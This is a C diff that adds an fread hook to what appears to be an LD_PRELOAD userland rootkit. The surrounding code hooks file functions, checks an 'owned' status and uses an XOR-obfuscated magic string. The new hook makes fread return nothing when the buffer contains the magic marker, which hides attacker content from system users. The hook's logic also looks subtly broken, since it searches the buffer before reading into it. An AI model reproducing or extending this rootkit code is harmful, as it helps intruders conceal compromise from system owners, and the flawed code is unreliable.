@@ -62,6 +62,9 @@ int (*old_openat)(int fd, const char *path, int oflag, ...);
 int (*old_faccessat)(int fd, const char *path, int amode, int flag); 
 FILE *(*old_fopen)(const char *pathname, const char *mode); 
 
+//read 
+size_t (*old_fread)(void *ptr, size_t size, size_t nmemb, FILE *stream); 
+
 //write
 int (*old_creat)(const char *path, mode_t mode);
 int (*old_fputs)(const char *s, FILE *stream);
@@ -402,6 +405,24 @@ size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)
 	} 
 	CLEAN(magic); 
 	return old_fwrite(ptr, size, nmemb, stream);
+}
+
+size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
+{ 
+	HOOK(fread); 
+	#ifdef DEBUG 
+	printf("[!] fread hooked\n"); 
+	#endif 
+
+	if (owned()) return old_fread(ptr, size, nmemb, stream); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	if (strstr(ptr, magic))
+	{ 
+		CLEAN(magic); 
+		return 0; 
+	}
+	CLEAN(magic); 
+	return old_fread(ptr, size, nmemb, stream); 
 }
 
 int rename(const char *oldpath, const char *newpath)
